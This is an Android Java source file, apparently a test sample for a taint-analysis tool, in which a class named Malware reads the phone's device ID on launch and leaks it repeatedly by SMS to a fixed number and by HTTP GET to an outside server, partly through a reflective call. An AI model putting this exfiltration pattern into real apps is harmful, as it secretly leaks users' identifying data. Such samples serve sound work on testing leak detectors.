package stamp.stanford.malware;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.lang.reflect.Method;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class Malware extends Activity {
    public static void performLeak(String msg) {
	SmsManager sms = SmsManager.getDefault();
	sms.sendMultipartTextMessage("9995556677", null, sms.divideMessage(msg), null, null);
	try {
	    String getURL = "http://stanford.edu/~subodh/cgi-bin/stamp/id.php?gps=".concat(msg);
	    new DefaultHttpClient().execute(new HttpGet(getURL));
	} catch(Exception e) {
	    e.printStackTrace();
	}
    }

    @Override
	public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

	String deviceId = ((TelephonyManager)getSystemService(TELEPHONY_SERVICE)).getDeviceId();
	for (int i = 0; i < 10; ++i) {
	    try {
		System.out.println("Leaking");
		Method leakMethod = Malware.class.getMethod("performLeak", String.class);
		performLeak(deviceId);
		leakMethod.invoke(null, deviceId);
		Thread.sleep(1000);
	    } catch(Exception e) {
		e.printStackTrace();
	    }
	}
    }
    
    @Override
	public void onStart(){
	super.onStart();
    }
    
}
